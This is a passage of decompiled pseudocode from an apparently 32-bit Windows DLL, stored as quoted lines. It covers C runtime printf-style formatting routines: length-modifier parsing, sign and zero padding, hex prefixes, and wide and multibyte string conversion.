    "          *((_DWORD *)this + 10) = 7;",
    "          break;",
    "        case 'w':",
    "          *((_DWORD *)this + 10) = 12;",
    "          break;",
    "        case 'z':",
    "          *((_DWORD *)this + 10) = 6;",
    "          break;",
    "      }",
    "      return 1;",
    "    }",
    "    v8 = (_WORD *)*((_DWORD *)this + 3);",
    "    if ( *v8 == 108 )",
    "    {",
    "      *((_DWORD *)this + 3) = v8 + 1;",
    "      v9 = 4;",
    "    }",
    "    else",
    "    {",
    "      v9 = 3;",
    "    }",
    "    goto LABEL_44;",
    "  }",
    "  if ( (_WORD)v1 == 106 )",
    "  {",
    "    *((_DWORD *)this + 10) = 5;",
    "    return 1;",
    "  }",
    "  switch ( v1 )",
    "  {",
    "    case 'I':",
    "      v6 = (unsigned __int16 *)*((_DWORD *)this + 3);",
    "      v7 = *v6;",
    "      if ( v7 == 51 && v6[1] == 50 )",
    "      {",
    "        *((_DWORD *)this + 10) = 10;",
    "        *((_DWORD *)this + 3) = v6 + 2;",
    "      }",
    "      else if ( v7 == 54 )",
    "      {",
    "        if ( v6[1] == 52 )",
    "        {",
    "          *((_DWORD *)this + 10) = 11;",
    "          *((_DWORD *)this + 3) = v6 + 2;",
    "        }",
    "      }",
    "      else if ( v7 == 100 || v7 == 105 || v7 == 111 || v7 == 117 || v7 == 120 || v7 == 88 )",
    "      {",
    "        *((_DWORD *)this + 10) = 9;",
    "      }",
    "      return 1;",
    "    case 'L':",
    "      *((_DWORD *)this + 10) = 8;",
    "      return 1;",
    "    case 'T':",
    "      *((_DWORD *)this + 10) = 13;",
    "      return 1;",
    "  }",
    "  if ( (_WORD)v1 == 104 )",
    "  {",
    "    v4 = (_WORD *)*((_DWORD *)this + 3);",
    "    if ( *v4 == 104 )",
    "    {",
    "      *((_DWORD *)this + 3) = v4 + 1;",
    "      v5 = 1;",
    "LABEL_45:",
    "      *((_DWORD *)this + 10) = v5;",
    "      return 1;",
    "    }",
    "    v9 = 2;",
    "LABEL_44:",
    "    v5 = v9;",
    "    goto LABEL_45;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001B823(int this)",
    "{",
    "  int v1; // esi",
    "  int v2; // eax",
    "  int v3; // ebx",
    "  int v4; // eax",
    "  int v5; // eax",
    "  int v6; // eax",
    "  char v7; // al",
    "  int v8; // eax",
    "  int v9; // eax",
    "  int v10; // eax",
    "  int v11; // eax",
    "  int v12; // eax",
    "  int v13; // eax",
    "  int v14; // eax",
    "  int v15; // eax",
    "  int v16; // eax",
    "  int v17; // eax",
    "  int v19; // eax",
    "  int v20; // ecx",
    "  char v21; // dl",
    "  char v22; // ah",
    "  char v23; // al",
    "  char v24; // al",
    "  int v25; // edx",
    "  int v26; // ebx",
    "  int i; // ecx",
    "  int v28; // edi",
    "  int v29; // ebx",
    "  int *v30; // edi",
    "  int v31; // esi",
    "  _DWORD *v32; // edx",
    "  _DWORD *v33; // edx",
    "  int v34; // esi",
    "  bool v35; // zf",
    "  int v36; // eax",
    "  WCHAR *v37; // ecx",
    "  int v38; // edx",
    "  int v39; // eax",
    "  int v40; // eax",
    "  WCHAR v41; // ax",
    "  int v42; // ecx",
    "  int *v43; // edi",
    "  int v44; // edx",
    "  int v45; // ecx",
    "  int v46; // [esp-4h] [ebp-44h]",
    "  int v47; // [esp-4h] [ebp-44h]",
    "  __crt_cached_ptd_host *v48; // [esp-4h] [ebp-44h]",
    "  int v49; // [esp+10h] [ebp-30h]",
    "  __int64 v50; // [esp+18h] [ebp-28h] BYREF",
    "  WCHAR *Src; // [esp+20h] [ebp-20h] BYREF",
    "  int v52; // [esp+24h] [ebp-1Ch] BYREF",
    "  CHAR MultiByteStr[8]; // [esp+28h] [ebp-18h] BYREF",
    "  int v54; // [esp+3Ch] [ebp-4h]",
    "",
    "  v1 = this;",
    "  *(_DWORD *)MultiByteStr = this;",
    "  v2 = *(char *)(this + 45);",
    "  v3 = 0;",
    "  if ( v2 <= 100 )",
    "  {",
    "    if ( v2 != 100 )",
    "    {",
    "      if ( v2 <= 83 )",
    "      {",
    "        if ( v2 != 83 )",
    "        {",
    "          v4 = v2 - 65;",
    "          if ( v4 )",
    "          {",
    "            v5 = v4 - 2;",
    "            if ( v5 )",
    "            {",
    "              v6 = v5 - 2;",
    "              if ( v6 && (unsigned int)(v6 - 1) > 1 )",
    "                return 0;",
    "              goto LABEL_9;",
    "            }",
    "            goto LABEL_14;",
    "          }",
    "LABEL_9:",
    "          v7 = sub_1001C2B3(this);",
    "          goto LABEL_35;",
    "        }",
    "        goto LABEL_33;",
    "      }",
    "      v8 = v2 - 88;",
    "      if ( !v8 )",
    "      {",
    "        v7 = sub_1001A39C(this, 1);",
    "        goto LABEL_35;",
    "      }",
    "      v9 = v8 - 2;",
    "      if ( !v9 )",
    "      {",
    "        v7 = sub_1001C1CC(this);",
    "        goto LABEL_35;",
    "      }",
    "      v10 = v9 - 7;",
    "      if ( !v10 )",
    "        goto LABEL_9;",
    "      if ( v10 == 2 )",
    "      {",
    "LABEL_14:",
    "        v7 = sub_1001C637(0);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "    goto LABEL_25;",
    "  }",
    "  if ( v2 <= 111 )",
    "  {",
    "    if ( v2 == 111 )",
    "    {",
    "      v7 = sub_1001C7ED(this);",
    "      goto LABEL_35;",
    "    }",
    "    v11 = v2 - 101;",
    "    if ( !v11 )",
    "      goto LABEL_9;",
    "    v12 = v11 - 1;",
    "    if ( !v12 )",
    "      goto LABEL_9;",
    "    v13 = v12 - 1;",
    "    if ( !v13 )",
    "      goto LABEL_9;",
    "    v14 = v13 - 2;",
    "    if ( v14 )",
    "    {",
    "      if ( v14 == 5 )",
    "      {",
    "        v7 = sub_1001C768(this);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_25:",
    "    *(_DWORD *)(this + 28) |= 0x10u;",
    "    goto LABEL_26;",
    "  }",
    "  v15 = v2 - 112;",
    "  if ( v15 )",
    "  {",
    "    v16 = v15 - 3;",
    "    if ( !v16 )",
    "    {",
    "LABEL_33:",
    "      v7 = sub_1001C853(this);",
    "      goto LABEL_35;",
    "    }",
    "    v17 = v16 - 2;",
    "    if ( v17 )",
    "    {",
    "      if ( v17 == 3 )",
    "      {",
    "        v7 = sub_1001A39C(this, 0);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_26:",
    "    v7 = sub_1001A07D(this, 0);",
    "    goto LABEL_35;",
    "  }",
    "  v7 = sub_1001C827(this);",
    "LABEL_35:",
    "  if ( !v7 )",
    "    return 0;",
    "  if ( !*(_BYTE *)(v1 + 44) )",
    "  {",
    "    v19 = *(_DWORD *)(v1 + 28) >> 4;",
    "    LOWORD(Src) = 0;",
    "    v20 = 0;",
    "    BYTE2(Src) = 0;",
    "    v52 = 0;",
    "    if ( (v19 & 1) == 0 )",
    "      goto LABEL_46;",
    "    if ( (*(_DWORD *)(v1 + 28) & 0x40) != 0 )",
    "    {",
    "      LOBYTE(Src) = 45;",
    "    }",
    "    else",
    "    {",
    "      if ( (*(_BYTE *)(v1 + 28) & 1) == 0 )",
    "      {",
    "        if ( (*(_DWORD *)(v1 + 28) & 2) != 0 )",
    "        {",
    "          LOBYTE(Src) = 32;",
    "          v20 = 1;",
    "          v52 = 1;",
    "        }",
    "LABEL_46:",
    "        v21 = *(_BYTE *)(v1 + 45);",
    "        if ( v21 != 120 && v21 != 88 || (v22 = 1, (*(_DWORD *)(v1 + 28) & 0x20) == 0) )",
    "          v22 = 0;",
    "        if ( v21 == 97 || (v23 = 0, v21 == 65) )",
    "          v23 = 1;",
    "        if ( v22 || v23 )",
    "        {",
    "          *((_BYTE *)&Src + v20) = 48;",
    "          if ( v21 == 88 || v21 == 65 )",
    "            v24 = 88;",
    "          else",
    "            v24 = 120;",
    "          *((_BYTE *)&Src + v20 + 1) = v24;",
    "          v20 += 2;",
    "          v52 = v20;",
    "        }",
    "        v25 = *(_DWORD *)(v1 + 32) - *(_DWORD *)(v1 + 52) - v20;",
    "        v49 = v25;",
    "        if ( (*(_BYTE *)(v1 + 28) & 0xC) == 0 )",
    "        {",
    "          HIDWORD(v50) = 0;",
    "          if ( v25 > 0 )",
    "          {",
    "            v26 = *(_DWORD *)(v1 + 20);",
    "            for ( i = HIDWORD(v50); i < v25; ++i )",
    "            {",
    "              v28 = *(_DWORD *)(v1 + 1096);",
    "              if ( *(_DWORD *)(v28 + 8) == *(_DWORD *)(v28 + 4) )",
    "              {",
    "                if ( *(_BYTE *)(v28 + 12) )",
    "                  v29 = v26 + 1;",
    "                else",
    "                  v29 = -1;",
    "                *(_DWORD *)(v1 + 20) = v29;",
    "              }",
    "              else",
    "              {",
    "                *(_DWORD *)(v1 + 20) = v26 + 1;",
    "                ++*(_DWORD *)(v28 + 8);",
    "                *(_BYTE *)(**(_DWORD **)(v1 + 1096))++ = 32;",
    "              }",
    "              v26 = *(_DWORD *)(v1 + 20);",
    "              if ( v26 == -1 )",
    "                break;",
    "            }",
    "            v20 = v52;",
    "            v3 = 0;",
    "          }",
    "        }",
    "        v46 = *(_DWORD *)(v1 + 8);",
    "        v30 = (int *)(v1 + 20);",
    "        v52 = v1 + 1096;",
    "        sub_1001CB07(&Src, v20, v1 + 20, v46);",
    "        if ( (*(_DWORD *)(v1 + 28) & 8) != 0 && (*(_DWORD *)(v1 + 28) & 4) == 0 )",
    "        {",
    "          HIDWORD(v50) = 0;",
    "          if ( v49 > 0 )",
    "          {",
    "            v31 = *v30;",
    "            v32 = (_DWORD *)v52;",
    "            do",
    "            {",
    "              v33 = (_DWORD *)*v32;",
    "              if ( v33[2] == v33[1] )",
    "              {",
    "                if ( *((_BYTE *)v33 + 12) )",
    "                  v34 = v31 + 1;",
    "                else",
    "                  v34 = -1;",
    "                *v30 = v34;",
    "                v32 = (_DWORD *)v52;",
    "              }",
    "              else",
    "              {",
    "                *v30 = v31 + 1;",
    "                ++v33[2];",
    "                v32 = (_DWORD *)v52;",
    "                ***(_BYTE ***)v52 = 48;",
    "                ++*(_DWORD *)*v32;",
    "              }",
    "              v31 = *v30;",
    "              if ( *v30 == -1 )",
    "                break;",
    "              ++v3;",
    "            }",
    "            while ( v3 < v49 );",
    "            v1 = *(_DWORD *)MultiByteStr;",
    "            v3 = 0;",
    "          }",
    "        }",
    "        v35 = *(_BYTE *)(v1 + 56) == 0;",
    "        v54 = 0;",
    "        if ( v35 || *(int *)(v1 + 52) <= 0 )",
    "        {",
    "          sub_1001CB07(*(void **)(v1 + 48), *(_DWORD *)(v1 + 52), (int)v30, *(_DWORD *)(v1 + 8));",
    "          goto LABEL_101;",
    "        }",
    "        v36 = *(_DWORD *)(v1 + 8);",
    "        *(_DWORD *)MultiByteStr = v36;",
    "        if ( !*(_BYTE *)(v36 + 20) )",
    "        {",
    "          __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)v36);",
    "          v36 = *(_DWORD *)MultiByteStr;",
    "        }",
    "        v37 = *(WCHAR **)(v1 + 48);",
    "        v38 = *(_DWORD *)(v1 + 52);",
    "        if ( *(_DWORD *)(*(_DWORD *)(v36 + 12) + 8) == 65001 )",
    "        {",
    "          v52 = 0;",
    "          v50 = 0;",
    "          if ( !v38 )",
    "          {",
    "LABEL_101:",
    "            v42 = *(_DWORD *)(v1 + 20);",
    "            if ( v42 >= 0 && (*(_DWORD *)(v1 + 28) & 4) != 0 )",
    "            {",
    "              v43 = (int *)(v1 + 20);",
    "              if ( v49 > 0 )",
    "              {",
    "                do",
    "                {",
    "                  v44 = *(_DWORD *)(v1 + 1096);",
    "                  if ( *(_DWORD *)(v44 + 8) == *(_DWORD *)(v44 + 4) )",
    "                  {",
    "                    if ( *(_BYTE *)(v44 + 12) )",
    "                      v45 = v42 + 1;",
    "                    else",
    "                      v45 = -1;",
    "                    *v43 = v45;",
    "                  }",
    "                  else",
    "                  {",
    "                    *v43 = v42 + 1;",
    "                    ++*(_DWORD *)(v44 + 8);",
    "                    *(_BYTE *)(**(_DWORD **)(v1 + 1096))++ = 32;",
    "                  }",
    "                  v42 = *v43;",
    "                  if ( *v43 == -1 )",
    "                    break;",
    "                  ++v3;",
    "                }",
    "                while ( v3 < v49 );",
    "              }",
    "            }",
    "            return 1;",
    "          }",
    "          while ( 1 )",
    "          {",
    "            v39 = *v37;",
    "            v47 = *(_DWORD *)(v1 + 8);",
    "            Src = v37 + 1;",
    "            v40 = sub_100215C9(MultiByteStr, v39, &v50, v47);",
    "            if ( v40 == -1 )",
    "              break;",
    "            sub_1001CB07(MultiByteStr, v40, (int)v30, *(_DWORD *)(v1 + 8));",
    "            v37 = Src;",
    "            if ( ++v52 == *(_DWORD *)(v1 + 52) )",
    "              goto LABEL_101;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          HIDWORD(v50) = 0;",
    "          if ( !v38 )",
    "            goto LABEL_101;",
    "          while ( 1 )",
    "          {",
    "            v48 = *(__crt_cached_ptd_host **)(v1 + 8);",
    "            v41 = *v37;",
    "            v52 = 0;",
    "            Src = v37 + 1;",
    "            if ( sub_1002113B((int)&v52, MultiByteStr, 6u, v41, v48) || !v52 )",
    "              break;",
    "            sub_1001CB07(MultiByteStr, v52, (int)v30, *(_DWORD *)(v1 + 8));",
    "            v37 = Src;",
    "            if ( ++HIDWORD(v50) == *(_DWORD *)(v1 + 52) )",
    "              goto LABEL_101;",
    "          }",
    "        }",
    "        *v30 = -1;",
    "        goto LABEL_101;",
    "      }",
    "      LOBYTE(Src) = 43;",
    "    }",
    "    v20 = 1;",
    "    v52 = 1;",
    "    goto LABEL_46;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001BC62(int this)",
    "{",
    "  unsigned int v2; // eax",
    "  int v3; // ebx",
    "  unsigned int v4; // eax",
    "  unsigned int v5; // eax",
    "  unsigned int v6; // eax",
    "  char v7; // al",
    "  unsigned int v8; // eax",
    "  unsigned int v9; // eax",
    "  unsigned int v10; // eax",
    "  unsigned int v11; // eax",
    "  unsigned int v12; // eax",
    "  unsigned int v13; // eax",
    "  unsigned int v14; // eax",
    "  unsigned int v15; // eax",
    "  unsigned int v16; // eax",
    "  unsigned int v17; // eax",
    "  int v19; // eax",
    "  int v20; // ecx",
    "  int v21; // edx",
    "  __int16 v22; // di",
    "  char v23; // ah",
    "  char v24; // al",
    "  int v25; // eax",
    "  int v26; // edi",
    "  int v27; // edx",
    "  int v28; // edi",
    "  int *v29; // edi",
    "  int v30; // ecx",
    "  int v31; // edx",
    "  int v32; // ecx",
    "  int v33; // edx",
    "  int v34; // eax",
    "  unsigned int v35; // edx",
    "  int v36; // ecx",
    "  int v37; // ecx",
    "  __int16 v38; // dx",
    "  int v39; // eax",
    "  int v40; // eax",
    "  int v41; // ecx",
    "  bool v42; // zf",
    "  int v43; // eax",
    "  _WORD ***v44; // edx",
    "  int v45; // ecx",
    "  int v46; // ecx",
    "  int *v47; // edi",
    "  int v48; // edx",
    "  int v49; // ecx",
    "  __int16 v50; // [esp-4h] [ebp-44h]",
    "  struct _Mbstatet *v51; // [esp-4h] [ebp-44h]",
    "  int v52; // [esp-4h] [ebp-44h]",
    "  struct __crt_cached_ptd_host *v53; // [esp+0h] [ebp-40h]",
    "  __int16 v54; // [esp+10h] [ebp-30h]",
    "  __int16 v55; // [esp+14h] [ebp-2Ch]",
    "  int i; // [esp+14h] [ebp-2Ch]",
    "  int v57; // [esp+18h] [ebp-28h]",
    "  wchar_t v58[2]; // [esp+1Ch] [ebp-24h] BYREF",
    "  int v59; // [esp+20h] [ebp-20h] BYREF",
    "  int v60; // [esp+24h] [ebp-1Ch] BYREF",
    "  __int64 Src; // [esp+28h] [ebp-18h] BYREF",
    "  int v62; // [esp+3Ch] [ebp-4h]",
    "",
    "  v2 = *(unsigned __int16 *)(this + 46);",
    "  v3 = 0;",
    "  if ( v2 <= 0x64 )",
    "  {",
    "    if ( v2 != 100 )",
    "    {",
    "      if ( v2 <= 0x53 )",
    "      {",
    "        if ( v2 != 83 )",
    "        {",
    "          v4 = v2 - 65;",
    "          if ( v4 )",
    "          {",
    "            v5 = v4 - 2;",
    "            if ( v5 )",
    "            {",
    "              v6 = v5 - 2;",
    "              if ( v6 && v6 - 1 > 1 )",
    "                return 0;",
    "              goto LABEL_9;",
    "            }",
    "            goto LABEL_14;",
    "          }",
    "LABEL_9:",
    "          v7 = sub_1001C46A(this);",
    "          goto LABEL_35;",
    "        }",
    "        goto LABEL_33;",
    "      }",
    "      v8 = v2 - 88;",
    "      if ( !v8 )",
    "      {",
    "        v7 = sub_1001A529(this, 1);",
    "        goto LABEL_35;",
    "      }",
    "      v9 = v8 - 2;",
    "      if ( !v9 )",
    "      {",
    "        v7 = sub_1001C23F(this);",
    "        goto LABEL_35;",
    "      }",
    "      v10 = v9 - 7;",
    "      if ( !v10 )",
    "        goto LABEL_9;",
    "      if ( v10 == 2 )",
    "      {",
    "LABEL_14:",
    "        v7 = unknown_libname_16(0);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "    goto LABEL_25;",
    "  }",
    "  if ( v2 <= 0x6F )",
    "  {",
    "    if ( v2 == 111 )",
    "    {",
    "      v7 = sub_1001C80A(this);",
    "      goto LABEL_35;",
    "    }",
    "    v11 = v2 - 101;",
    "    if ( !v11 )",
    "      goto LABEL_9;",
    "    v12 = v11 - 1;",
    "    if ( !v12 )",
    "      goto LABEL_9;",
    "    v13 = v12 - 1;",
    "    if ( !v13 )",
    "      goto LABEL_9;",
    "    v14 = v13 - 2;",
    "    if ( v14 )",
    "    {",
    "      if ( v14 == 5 )",
    "      {",
    "        v7 = sub_1001C768(this);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_25:",
    "    *(_DWORD *)(this + 28) |= 0x10u;",
    "    goto LABEL_26;",
    "  }",
    "  v15 = v2 - 112;",
    "  if ( v15 )",
    "  {",
    "    v16 = v15 - 3;",
    "    if ( !v16 )",
    "    {",
    "LABEL_33:",
    "      v7 = sub_1001C8C6(this);",
    "      goto LABEL_35;",
    "    }",
    "    v17 = v16 - 2;",
    "    if ( v17 )",
    "    {",
    "      if ( v17 == 3 )",
    "      {",
    "        v7 = sub_1001A529(this, 0);",
    "        goto LABEL_35;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_26:",
    "    v7 = sub_1001A20A(this, 0);",
    "    goto LABEL_35;",
    "  }",
    "  v7 = sub_1001C83D(this);",
    "LABEL_35:",
    "  if ( !v7 )",
    "    return 0;",
    "  if ( !*(_BYTE *)(this + 44) )",
    "  {",
    "    v19 = *(_DWORD *)(this + 28) >> 4;",
    "    LODWORD(Src) = 0;",
    "    v20 = 0;",
    "    WORD2(Src) = 0;",
    "    v60 = 0;",
    "    if ( (v19 & 1) != 0 )",
    "    {",
    "      if ( (*(_DWORD *)(this + 28) & 0x40) != 0 )",
    "      {",
    "        v50 = 45;",
    "      }",
    "      else",
    "      {",
    "        if ( (*(_BYTE *)(this + 28) & 1) == 0 )",
    "        {",
    "          if ( (*(_DWORD *)(this + 28) & 2) != 0 )",
    "          {",
    "            LOWORD(Src) = 32;",
    "            v20 = 1;",
    "            v60 = 1;",
    "          }",
    "          goto LABEL_46;",
    "        }",
    "        v50 = 43;",
    "      }",
    "      v20 = 1;",
    "      LOWORD(Src) = v50;",
    "      v60 = 1;",
    "    }",
    "LABEL_46:",
    "    v21 = *(unsigned __int16 *)(this + 46);",
    "    v22 = 120;",
    "    if ( (_WORD)v21 != 120 && (_WORD)v21 != 88 || (v23 = 1, (*(_DWORD *)(this + 28) & 0x20) == 0) )",
    "      v23 = 0;",
    "    if ( v21 == 97 || (v24 = 0, (_WORD)v21 == 65) )",
    "      v24 = 1;",
    "    v59 = 48;",
    "    if ( v23 || v24 )",
    "    {",
    "      *((_WORD *)&Src + v20) = v59;",
    "      if ( (_WORD)v21 == 88 || (_WORD)v21 == 65 )",
    "        v22 = 88;",
    "      *((_WORD *)&Src + v20 + 1) = v22;",
    "      v20 += 2;",
    "      v60 = v20;",
    "    }",
    "    v25 = *(_DWORD *)(this + 32) - *(_DWORD *)(this + 52) - v20;",
    "    v57 = v25;",
    "    if ( (*(_BYTE *)(this + 28) & 0xC) == 0 && v25 > 0 )",
    "    {",
    "      v26 = *(_DWORD *)(this + 20);",
    "      do",
    "      {",
    "        v27 = *(_DWORD *)(this + 1096);",
    "        if ( *(_DWORD *)(v27 + 8) == *(_DWORD *)(v27 + 4) )",
    "        {",
    "          if ( *(_BYTE *)(v27 + 12) )",
    "            v28 = v26 + 1;",
    "          else",
    "            v28 = -1;",
    "          *(_DWORD *)(this + 20) = v28;",
    "        }",
    "        else",
    "        {",
    "          *(_DWORD *)(this + 20) = v26 + 1;",
    "          ++*(_DWORD *)(v27 + 8);",
    "          ***(_WORD ***)(this + 1096) = 32;",
    "          **(_DWORD **)(this + 1096) += 2;",
    "        }",
    "        v26 = *(_DWORD *)(this + 20);",
    "        if ( v26 == -1 )",
    "          break;",
    "        ++v3;",
    "      }",
    "      while ( v3 < v25 );",
    "      v20 = v60;",
    "      v3 = 0;",
    "    }",
    "    v29 = (int *)(this + 20);",
    "    sub_1001CB76(&Src, v20, this + 20, *(_DWORD *)(this + 8));",
    "    v30 = *(_DWORD *)(this + 28);",
    "    if ( (v30 & 8) != 0 && (v30 & 4) == 0 )",
    "    {",
    "      *(_DWORD *)v58 = 0;",
    "      if ( v57 > 0 )",
    "      {",
    "        v31 = *v29;",
    "        do",
    "        {",
    "          v32 = *(_DWORD *)(this + 1096);",
    "          if ( *(_DWORD *)(v32 + 8) == *(_DWORD *)(v32 + 4) )",
    "          {",
    "            if ( *(_BYTE *)(v32 + 12) )",
    "              v33 = v31 + 1;",
    "            else",
    "              v33 = -1;",
    "            *v29 = v33;",
    "          }",
    "          else",
    "          {",
    "            *v29 = v31 + 1;",
    "            ++*(_DWORD *)(v32 + 8);",
    "            ***(_WORD ***)(this + 1096) = v59;",
    "            **(_DWORD **)(this + 1096) += 2;",
    "          }",
    "          v31 = *v29;",
    "          if ( *v29 == -1 )",
    "            break;",
    "          ++v3;",
    "        }",
    "        while ( v3 < v57 );",
    "        v3 = 0;",
    "      }",
    "    }",
    "    v42 = *(_BYTE *)(this + 56) == 0;",
    "    v62 = 0;",
    "    if ( v42 && *(int *)(this + 52) > 0 )",
    "    {",
    "      v34 = *(_DWORD *)(this + 8);",
    "      *(_DWORD *)v58 = v34;",
    "      if ( !*(_BYTE *)(v34 + 20) )",
    "      {",
    "        __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)v34);",
    "        v34 = *(_DWORD *)v58;",
    "      }",
    "      if ( *(_DWORD *)(*(_DWORD *)(v34 + 12) + 8) == 65001 )",
    "      {",
    "        *(_DWORD *)v58 = *(_DWORD *)(this + 48);",
    "        Src = 0;",
    "        v59 = 0;",
    "        if ( *(_DWORD *)(this + 52) )",
    "        {",
    "          while ( 1 )",
    "          {",
    "            v51 = *(struct _Mbstatet **)(this + 8);",
    "            v60 = 0;",
    "            v35 = __crt_mbstring::__mbsrtowcs_utf8(",
    "                    (__crt_mbstring *)&v60,",
    "                    v58,",
    "                    (const char **)2,",
    "                    (unsigned int)&Src,",
    "                    v51,",
    "                    v53);",
    "            if ( v35 == -1 )",
    "              break;",
    "            v36 = *(_DWORD *)(this + 1096);",
    "            v55 = v60;",
    "            if ( *(_DWORD *)(v36 + 8) == *(_DWORD *)(v36 + 4) )",
    "            {",
    "              if ( *(_BYTE *)(v36 + 12) )",
    "                ++*v29;",
    "              else",
    "                *v29 = -1;",
    "            }",
    "            else",
    "            {",
    "              ++*v29;",
    "              ++*(_DWORD *)(v36 + 8);",
    "              ***(_WORD ***)(this + 1096) = v55;",
    "              **(_DWORD **)(this + 1096) += 2;",
    "            }",
    "            if ( v35 == 2 )",
    "            {",
    "              v37 = *(_DWORD *)(this + 1096);",
    "              v38 = HIWORD(v60);",
    "              if ( *(_DWORD *)(v37 + 8) == *(_DWORD *)(v37 + 4) )",
    "              {",
    "                if ( *(_BYTE *)(v37 + 12) )",
    "                  ++*v29;",
    "                else",
    "                  *v29 = -1;",
    "              }",
    "              else",
    "              {",
    "                ++*v29;",
    "                ++*(_DWORD *)(v37 + 8);",
    "                ***(_WORD ***)(this + 1096) = v38;",
    "                **(_DWORD **)(this + 1096) += 2;",
    "              }",
    "              v39 = v59 + 1;",
    "            }",
    "            else",
    "            {",
    "              v39 = v59;",
    "            }",
    "            v59 = v39 + 1;",
    "            if ( v39 + 1 == *(_DWORD *)(this + 52) )",
    "              goto LABEL_120;",
    "          }",
    "LABEL_118:",
    "          *v29 = -1;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v40 = *(_DWORD *)(this + 8);",
    "        *(_DWORD *)v58 = v40;",
    "        if ( !*(_BYTE *)(v40 + 20) )",
    "        {",
    "          __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)v40);",
    "          v40 = *(_DWORD *)v58;",
    "        }",
    "        v41 = *(_DWORD *)(this + 48);",
    "        v42 = *(_DWORD *)(this + 52) == 0;",
    "        for ( i = 0; ; ++i )",
    "        {",
    "          v60 = v41;",
    "          if ( v42 )",
    "            break;",
    "          v43 = *(_DWORD *)(v40 + 12);",
    "          v52 = *(_DWORD *)(this + 8);",
    "          LOWORD(v59) = 0;",
    "          HIDWORD(Src) = sub_1002129F(&v59, v41, *(_DWORD *)(v43 + 4), v52);",
    "          if ( SHIDWORD(Src) <= 0 )",
    "            goto LABEL_118;",
    "          v44 = (_WORD ***)(this + 1096);",
    "          v45 = *(_DWORD *)(this + 1096);",
    "          v54 = v59;",
    "          if ( *(_DWORD *)(v45 + 8) == *(_DWORD *)(v45 + 4) )",
    "          {",
    "            if ( *(_BYTE *)(v45 + 12) )",
    "              ++*v29;",
    "            else",
    "              *v29 = -1;",
    "          }",
    "          else",
    "          {",
    "            ++*v29;",
    "            ++*(_DWORD *)(v45 + 8);",
    "            *(**v44)++ = v54;",
    "          }",
    "          v41 = HIDWORD(Src) + v60;",
    "          v42 = i + 1 == *(_DWORD *)(this + 52);",
    "          v40 = *(_DWORD *)v58;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      sub_1001CB76(*(void **)(this + 48), *(_DWORD *)(this + 52), this + 20, *(_DWORD *)(this + 8));",
    "    }",
    "LABEL_120:",
    "    v46 = *(_DWORD *)(this + 20);",
    "    if ( v46 >= 0 && (*(_DWORD *)(this + 28) & 4) != 0 )",
    "    {",
    "      v47 = (int *)(this + 20);",
    "      if ( v57 > 0 )",
    "      {",
    "        do",
    "        {",
    "          v48 = *(_DWORD *)(this + 1096);",
    "          if ( *(_DWORD *)(v48 + 8) == *(_DWORD *)(v48 + 4) )",
    "          {",
    "            if ( *(_BYTE *)(v48 + 12) )",
    "              v49 = v46 + 1;",
    "            else",
    "              v49 = -1;",
    "            *v47 = v49;",
    "          }",
    "          else",
    "          {",
    "            *v47 = v46 + 1;",
    "            ++*(_DWORD *)(v48 + 8);",
    "            ***(_WORD ***)(this + 1096) = 32;",
    "            **(_DWORD **)(this + 1096) += 2;",
    "          }",
    "          v46 = *v47;",
    "          if ( *v47 == -1 )",
    "            break;",
    "          ++v3;",
    "        }",
    "        while ( v3 < v57 );",
    "      }",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl sub_1001C178(int a1)",
    "{",
    "  int result; // eax",
    "  int v2; // [esp-4h] [ebp-4h]",
    "",
    "  switch ( a1 )",
    "  {",
    "    case 0:",
    "    case 3:",
    "    case 6:",
    "    case 7:",
    "    case 9:",
    "    case 10:",
    "      v2 = 4;",
    "      goto LABEL_4;",
    "    case 1:",
    "      return 1;",
    "    case 2:",
    "      v2 = 2;",
    "      goto LABEL_4;",
    "    case 4:",
    "    case 5:",
    "    case 11:",
    "      v2 = 8;",
    "LABEL_4:",
    "      result = v2;",
    "      break;",
    "    default:",
    "      result = 0;",
    "      break;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C1CC(void *this)",
    "{",
    "  unsigned __int16 **v2; // edx",
    "  unsigned __int16 *v3; // ebx",
    "  char v4; // dl",
    "  int v5; // eax",
    "  int v6; // esi",
    "  unsigned int v7; // ebx",
    "  bool v8; // zf",
    "  int v9; // eax",
    "  int v11; // [esp-8h] [ebp-18h]",
    "  unsigned __int16 *v12; // [esp+8h] [ebp-8h]",
    "",
    "  v2 = (unsigned __int16 **)*((_DWORD *)this + 4);",
    "  *((_DWORD *)this + 4) = v2 + 1;",
    "  v3 = *v2;",
    "  v12 = *v2;",
    "  if ( !*v2 || !*((_DWORD *)v3 + 1) )",
    "  {",
    "    v9 = 6;",
    "    *((_DWORD *)this + 12) = \"(null)\";",
    "    goto LABEL_6;",
    "  }",
    "  v4 = *((_BYTE *)this + 45);",
    "  v5 = *((_DWORD *)this + 1);",
    "  v6 = *(_DWORD *)this;",
    "  v11 = *((_DWORD *)this + 10);",
    "  *((_DWORD *)this + 12) = *((_DWORD *)v3 + 1);",
    "  v7 = *v12;",
    "  v8 = !__crt_stdio_output::is_wide_character_specifier<char>(v6, v5, v4, v11);",
    "  v9 = v7;",
    "  if ( v8 )",
    "  {",
    "LABEL_6:",
    "    *((_BYTE *)this + 56) = 0;",
    "    goto LABEL_7;",
    "  }",
    "  *((_BYTE *)this + 56) = 1;",
    "  v9 = v7 >> 1;",
    "LABEL_7:",
    "  *((_DWORD *)this + 13) = v9;",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001C23F(int *this)",
    "{",
    "  unsigned __int16 **v2; // edx",
    "  unsigned __int16 *v3; // ebx",
    "  __int16 v4; // dx",
